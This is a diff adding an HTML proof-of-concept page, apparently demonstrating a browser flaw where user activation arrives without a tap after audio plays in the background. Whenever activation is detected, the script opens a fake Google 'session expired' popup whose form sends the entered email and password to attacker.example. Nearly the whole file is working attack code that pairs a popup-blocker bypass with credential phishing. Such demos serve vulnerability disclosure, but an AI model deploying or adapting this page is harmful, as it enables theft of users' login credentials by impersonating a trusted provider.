@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<button id="s">Play Music</button>
+<pre id="l" style="font-size:13px"></pre>
+<audio id="a" src="tone.wav" loop></audio>
+<script>
+const l=document.getElementById('l'),a=document.getElementById('a');
+let n=0;
+document.getElementById('s').onclick=()=>{
+  a.volume=0.3;a.play();
+  navigator.mediaSession.metadata=new MediaMetadata({title:'My Playlist'});
+  document.getElementById('s').disabled=true;
+  l.textContent='Playing. Wait 6s...\n';
+  setTimeout(()=>{
+    l.textContent+='Monitoring. Switch to another app with audio.\n\n';
+    setInterval(()=>{
+      if(!navigator.userActivation.isActive)return;
+      n++;
+      l.textContent+='[!] Activation #'+n+' without tap\n';
+
+      // ATTACK: open a convincing phishing popup
+      var w=window.open('','_blank');
+      if(w){
+        w.document.write(`<!DOCTYPE html>
+<html><head><title>Security Alert</title>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:system-ui;background:#fff;padding:24px}
+.header{background:#d93025;color:#fff;padding:16px;border-radius:8px;margin-bottom:16px}
+h2{font-size:18px}
+p{margin:8px 0;font-size:14px;color:#333}
+input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;font-size:16px}
+button{width:100%;padding:14px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:16px;margin-top:8px}
+.logo{font-size:24px;margin-bottom:8px}
+</style></head><body>
+<div class=header><div class=logo>&#9888;</div>
+<h2>Your Google session has expired</h2></div>
+<p>For your security, please verify your identity to continue.</p>
+<form onsubmit="fetch('https://attacker.example/steal?u='+encodeURIComponent(this.e.value)+'&p='+encodeURIComponent(this.p.value));return false">
+<input name=e placeholder="Email" type=email>
+<input name=p placeholder="Password" type=password>
+<button type=submit>Verify</button>
+</form>
+<p style="font-size:11px;color:#999;margin-top:16px">Google LLC — accounts.google.com</p>
+</body></html>`);
+        w.document.close();
+        l.textContent+='    Phishing popup opened!\n';
+      }
+    },200);
+  },6000);
+};
+</script>
